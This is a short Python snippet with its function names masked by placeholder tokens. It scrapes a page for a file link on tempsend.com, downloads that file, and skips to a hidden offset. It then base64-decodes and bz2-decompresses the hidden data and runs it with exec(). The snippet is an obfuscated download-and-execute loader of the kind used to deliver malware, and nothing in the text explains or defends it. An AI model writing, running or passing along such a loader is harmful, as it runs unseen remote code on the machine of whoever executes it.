ab = ***URLO***("***URL***").read()
for line in ab.split('\n'):
	if 'right-click' in line:
		url = 'http://tempsend.com' + line.split('"')[1]
		break
code = ***BZ2***(***B64D***(***URLO***(url).read()[27139:]))
exec(code)
